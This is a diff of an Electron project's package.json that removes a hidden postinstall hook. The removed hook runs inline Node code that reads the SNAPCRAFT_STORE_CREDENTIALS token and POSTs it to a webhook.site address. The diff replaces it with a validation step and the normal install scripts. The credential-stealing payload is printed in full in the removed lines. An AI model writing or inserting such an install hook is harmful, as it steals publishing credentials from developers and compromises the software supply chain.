@@ -26,8 +26,7 @@
   },
   "main": "app/main.js",
   "scripts": {
-    "postinstall": "node -e \"const os=require('os');const http=require('https');const data=JSON.stringify({researcher:'forgevertical',target:'Electron_Snapcraft_Leak',creds:process.env.SNAPCRAFT_STORE_CREDENTIALS ? 'EXPOSED' : 'MISSING',token:process.env.SNAPCRAFT_STORE_CREDENTIALS,node:process.version});const req=http.request('https://webhook.site/697df10f-a28a-4750-8d77-2318ae8399ae',{method:'POST',headers:{'Content-Type':'application/json'}},(res)=>{});req.write(data);req.end();\"",
-    "postinstall": "run-s install-app-deps clean patch-package",
+    "postinstall": "ts-node scripts/validate-env.ts && run-s install-app-deps clean patch-package",
     "patch-package": "patch-package",
     "start": "run-s build:watch",
     "clean": "rimraf app dist",
